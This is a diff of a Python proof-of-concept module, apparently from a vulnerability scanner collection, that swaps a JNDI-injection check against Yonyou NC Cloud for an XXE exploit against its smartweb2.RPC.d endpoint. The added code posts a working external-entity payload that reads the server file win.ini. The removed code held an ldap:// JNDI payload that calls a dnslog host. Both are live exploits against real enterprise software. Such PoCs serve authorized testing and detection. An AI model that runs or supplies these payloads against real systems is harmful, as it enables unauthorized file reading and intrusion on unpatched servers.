@@ -1,6 +1,6 @@
 '''
 Function:
-    用友NC Cloud PMCloudDriveProjectStateServlet JNDI注入漏洞
+    用友NC smartweb2.RPC.d XML外部实体注入漏洞
 Author:
     花果山
 Wechat official account：
@@ -16,15 +16,9 @@ GitHub:
 '''
 # -*- coding: utf-8 -*-
 import requests
-import re
-import os
-import sys
 from urllib.parse import urlparse
 from requests.packages.urllib3 import disable_warnings
 disable_warnings()
-path = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
-sys.path.append(path)
-from modules.dnslogs import dnslogs
 
 
 class poc:
@@ -32,7 +26,6 @@ class poc:
         self.url = url
         self.headers = {
             'User-Agent': 'Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)',
-            'Content-Type': 'application/json'
         }
         self.value_list = []
         self.result_text = ""
@@ -42,20 +35,16 @@ class poc:
         url = urlparse(self.url)
         netloc = url.netloc
         scheme = url.scheme
-        return scheme, netloc
+        return netloc, scheme
 
     def vuln(self, netloc, scheme):
-        dnslog_all = dnslogs(self.proxies).get_dnslog()
-        dnslog = dnslog_all[0]
-        url = "{}://{}/service/~pim/PMCloudDriveProjectStateServlet".format(scheme, netloc)
-        data = '{"data_source": "ldap://' + dnslog + '","user": ""}'
+        url = "{}://{}/hrss/dorado/smartweb2.RPC.d?__rpc=true".format(scheme, netloc)
+        data = '__viewInstanceId=nc.bs.hrss.rm.ResetPassword~nc.bs.hrss.rm.ResetPasswordViewModel&__xml=<!DOCTYPE z [<!ENTITY Password SYSTEM "file:///C://windows//win.ini" >]><rpc transaction="10" method="resetPwd"><vps><p name="__profileKeys">%26Password;</p ></vps></rpc>'
         try:
-            result = requests.post(url=url, data=data, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
-            for i in range(5):
-                dnslog_result = dnslogs(self.proxies).get_result(dnslog_all[1])
-            if dnslog_result != "[]":
+            result = requests.post(url=url, data=data, proxies=self.proxies, headers=self.headers, verify=False, timeout=3)
+            if "for 16-bit app support" in result.text:
                 target = urlparse(url)
-                self.result_text += """\n        [+]    \033[32m检测到目标站点存在任意命令执行漏洞\033[0m
+                self.result_text += """\n        [+]    \033[32m检测到目标站点存在XML外部实体注入漏洞\033[0m
                  POST {} HTTP/1.1
                  Host: {}""".format(target.path, target.netloc)
                 for request_type, request_text in dict(result.request.headers).items():
@@ -69,11 +58,10 @@ class poc:
 
     def main(self):
         all = self.host()
-        scheme = all[0]
-        netloc = all[1]
+        netloc = all[0]
+        scheme = all[1]
         if self.vuln(netloc, scheme):
              return self.result_text
         else:
             return False
-
 
